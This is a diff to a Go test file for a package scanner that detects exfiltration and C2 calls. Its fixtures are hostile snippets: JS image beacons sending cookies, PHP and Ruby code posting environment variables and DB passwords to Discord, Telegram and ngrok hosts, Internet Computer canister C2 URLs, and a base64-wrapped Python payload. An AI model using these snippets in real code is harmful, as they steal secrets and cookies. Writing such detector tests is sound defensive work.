@@ -1,6 +1,10 @@
 package iocscan
 
-import "testing"
+import (
+	"encoding/base64"
+	"strings"
+	"testing"
+)
 
 func files(m map[string]string) map[string][]byte {
 	out := make(map[string][]byte, len(m))
@@ -396,6 +400,133 @@ func TestScan_PublicIPv4C2(t *testing.T) {
 	} {
 		if r := Scan(files(fs)); r.Detected {
 			t.Errorf("%s: want clean, got %+v", name, r)
+		}
+	}
+}
+
+// TestScan_ICPCanisterRaw: CanisterWorm (2026-03) and pgserve (2026-04) used
+// raw Internet Computer canisters as C2 and drop. The canister-id form under
+// raw.icp0.io / raw.ic0.app is an exfil_host; ICP SDK prose and the
+// certified boundary hosts are not.
+func TestScan_ICPCanisterRaw(t *testing.T) {
+	for name, fs := range map[string]map[string]string{
+		"pgserve drop": {"package/scripts/check-env.cjs": "const https=require('https');\nconst C='https://cjn37-uyaaa-aaaac-qgnva-cai.raw.icp0.io/drop';\nhttps.request(C,{method:'POST'});\n"},
+		"python poll":  {"pkg/service.py": "import urllib.request\nC2='https://tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io/'\nurllib.request.urlopen(C2)\n"},
+		"ic0.app raw":  {"package/a.js": "fetch('https://rdmx6-jaaaa-aaaaa-aaadq-cai.raw.ic0.app/x')\n"},
+	} {
+		if r := Scan(files(fs)); !r.Detected || r.Kind != "exfil_host" || !r.Coupled {
+			t.Errorf("%s: want coupled exfil_host, got %+v", name, r)
+		}
+	}
+	for name, fs := range map[string]map[string]string{
+		"sdk prose":         {"package/lib/agent.js": "// raw URLs look like https://<canister-id>.raw.icp0.io\nfetch(host)\n"},
+		"boundary node":     {"package/lib/agent.js": "const host='https://icp-api.io';fetch('https://ic0.app/api/v2/status')\n"},
+		"certified dapp":    {"package/a.js": "fetch('https://rdmx6-jaaaa-aaaaa-aaadq-cai.icp0.io/')\n"},
+		"longer first part": {"package/a.js": "fetch('https://xrdmx6-jaaaa-aaaaa-aaadq-cai.raw.icp0.io/')\n"},
+	} {
+		if r := Scan(files(fs)); r.Detected {
+			t.Errorf("%s: want clean, got %+v", name, r)
+		}
+	}
+}
+
+// TestScan_ImageBeacon: helpersutils-dev-tools (MAL-2026-16465) beaconed with
+// `new Image().src=`, not fetch(). That couples the public-IP rule and the
+// exfil_host tier; a bare IP or a bare .src assignment still does not fire.
+func TestScan_ImageBeacon(t *testing.T) {
+	for name, fs := range map[string]map[string]string{
+		"documented":     {"package/index.js": "(function(){var i=new Image();i.src='http://5.189.173.113:8899/csp-edu?d='+encodeURIComponent(document.domain);})();\n"},
+		"one-liner":      {"package/bypass.js": "new Image().src=\"http://5.189.173.113:8899/csp?d=\"+document.domain;\n"},
+		"script src":     {"package/a.js": "var s=document.createElement('script');s.src='http://45.61.1.2/p.js';document.head.appendChild(s);\n"},
+		"webhook beacon": {"package/a.js": "new Image().src='https://webhook.site/abc?c='+document.cookie;\n"},
+	} {
+		if r := Scan(files(fs)); !r.Detected || r.Kind != "exfil_host" || !r.Coupled {
+			t.Errorf("%s: want coupled exfil_host, got %+v", name, r)
+		}
+	}
+	for name, fs := range map[string]map[string]string{
+		"bare ip, no send":   {"package/index.js": "const DEFAULT='http://5.189.173.113:8899/';module.exports=DEFAULT;\n"},
+		"image, private ip":  {"package/a.js": "new Image().src='http://192.168.1.10/pixel.gif';\n"},
+		"image, no ip":       {"package/a.js": "var i=new Image();i.src=url;\n"},
+		"comparison not set": {"package/a.js": "if(img.src=='http://5.189.173.113/x'){}\n"},
+	} {
+		if r := Scan(files(fs)); r.Detected {
+			t.Errorf("%s: want clean, got %+v", name, r)
+		}
+	}
+}
+
+// TestScan_Base64Literal: CanisterWorm (2026-03) kept its canister C2 inside a
+// base64 Python payload. Quoted base64 literals that decode to text are read
+// by the host and IP rules; a send in the file or in the decoded text
+// couples. Binary (an inlined PNG), data: URIs and hashes are not decoded.
+func TestScan_Base64Literal(t *testing.T) {
+	b := func(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }
+	py := "import urllib.request\nC2='https://tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io/'\nurllib.request.urlopen(C2).read()\n"
+	for name, tc := range map[string]struct {
+		body    string
+		coupled bool
+	}{
+		"send only in decoded": {"const P='" + b(py) + "';\nrequire('fs').writeFileSync(f, Buffer.from(P,'base64'));\n", true},
+		"send only in file":    {"const u=Buffer.from(\"" + b("https://discord.com/api/webhooks/1/abc") + "\",'base64').toString();fetch(u,{method:'POST'});\n", true},
+		"no send anywhere":     {"module.exports='" + b("see https://webhook.site/abc for the token") + "';\n", false},
+	} {
+		r := Scan(files(map[string]string{"package/index.js": tc.body}))
+		if !r.Detected || r.Kind != "exfil_host" || r.Coupled != tc.coupled || !strings.HasSuffix(r.Detail, " (in base64)") {
+			t.Errorf("%s: want exfil_host coupled=%v (in base64), got %+v", name, tc.coupled, r)
+		}
+	}
+	if r := Scan(files(map[string]string{"package/a.js": "fetch(x);const c='" + b("http://5.189.173.113:8899/csp?d=") + "';\n"})); !r.Detected || !r.Coupled {
+		t.Errorf("public IP in base64 with a send: want coupled exfil_host, got %+v", r)
+	}
+	png := string([]byte{0x89, 'P', 'N', 'G', 0x0d, 0x0a, 0x1a, 0x0a}) + strings.Repeat("\x00\x01https://webhook.site/x", 4)
+	for name, body := range map[string]string{
+		"binary blob": "fetch(u);const img='" + base64.StdEncoding.EncodeToString([]byte(png)) + "';\n",
+		"data uri":    "fetch(u);const img='data:text/plain;base64," + b("https://webhook.site/abcdefghijklmnop") + "';\n",
+		"benign text": "fetch(u);const t='" + b("Copyright (c) Example. See https://github.com/example/lib") + "';\n",
+		"sha1 hex":    "fetch(u);const h='da39a3ee5e6b4b0d3255bfef95601890afd80709';\n",
+	} {
+		if r := Scan(files(map[string]string{"package/a.js": body})); r.Detected {
+			t.Errorf("%s: want clean, got %+v", name, r)
+		}
+	}
+	if r := Scan(files(map[string]string{"package/test/a.js": "const P='" + b(py) + "';\n"})); !r.Weak {
+		t.Errorf("base64 hit in a test file must stay weak, got %+v", r)
+	}
+}
+
+// TestScan_PHPRubySends: laravel-lang (2026-05) posted from an autoloaded
+// helpers.php; SleeperGem (2026-07) used Net::HTTP. PHP and Ruby send calls
+// couple an exfil host or a public IP; file_get_contents on a path does not.
+func TestScan_PHPRubySends(t *testing.T) {
+	for name, fs := range map[string]map[string]string{
+		"php curl_exec":      {"src/helpers.php": "<?php\n$h = curl_init('https://discord.com/api/webhooks/1/x');\ncurl_setopt($h, CURLOPT_POSTFIELDS, json_encode(getenv()));\ncurl_exec($h);\n"},
+		"php file_get_url":   {"src/a.php": "<?php file_get_contents('http://45.61.1.2/c?d=' . base64_encode(serialize($_ENV)));\n"},
+		"php wordpress post": {"wp-content/plugins/x/x.php": "<?php wp_remote_post('https://api.telegram.org/bot1:A/sendMessage', ['body' => $creds]);\n"},
+		"php fsockopen":      {"src/a.php": "<?php $s = fsockopen('x.oast.fun', 80); fwrite($s, getenv('DB_PASSWORD'));\n"},
+		"ruby Net::HTTP":     {"lib/dendreo.rb": "require 'net/http'\nNet::HTTP.post(URI('https://discord.com/api/webhooks/1/x'), ENV.to_h.to_s)\n"},
+		"ruby URI.open":      {"lib/a.rb": "require 'open-uri'\nURI.open('http://45.61.1.2/s?h=' + `hostname`)\n"},
+		"ruby TCPSocket":     {"lib/a.rb": "s = TCPSocket.new('abc123.ngrok.io', 4444)\ns.write(ENV.to_h.to_s)\n"},
+		"python .pth line":   {"evil.pth": "import urllib.request; urllib.request.urlopen('http://45.61.1.2/b')\n"},
+	} {
+		if r := Scan(files(fs)); !r.Detected || r.Kind != "exfil_host" || !r.Coupled {
+			t.Errorf("%s: want coupled exfil_host, got %+v", name, r)
+		}
+	}
+	for name, fs := range map[string]map[string]string{
+		"php reads a local file": {"src/a.php": "<?php $c = file_get_contents(__DIR__ . '/config.php'); // http://45.61.1.2 in docs\n"},
+		"ruby names an IP":       {"lib/a.rb": "DEFAULT_PROXY = 'http://45.61.1.2:3128'\n"},
+		"ruby suffix list":       {"lib/domain_name/etld_data.rb": "ETLD_DATA = {\n  'ngrok.io' => 0,\n  'x.ngrok.io' => 0,\n}\n"},
+		"ruby metaprogramming":   {"lib/a.rb": "obj.send(:post, 'https://discord.com/api/webhooks/1/x')\n"},
+		"ruby stealer strings":   {"lib/os/windows_exports.rb": "EXPORTS = %w[GetAsyncKeyState]\nobj.send(:x)\n"},
+	} {
+		if r := Scan(files(fs)); r.Detected {
+			t.Errorf("%s: want clean, got %+v", name, r)
+		}
+	}
+	for n, want := range map[string]bool{"src/helpers.php": true, "lib/x.RB": true, "site.pth": true, "a.js": false, "a.phpx": false} {
+		if WantsScriptSource(n) != want {
+			t.Errorf("WantsScriptSource(%q) != %v", n, want)
 		}
 	}
 }
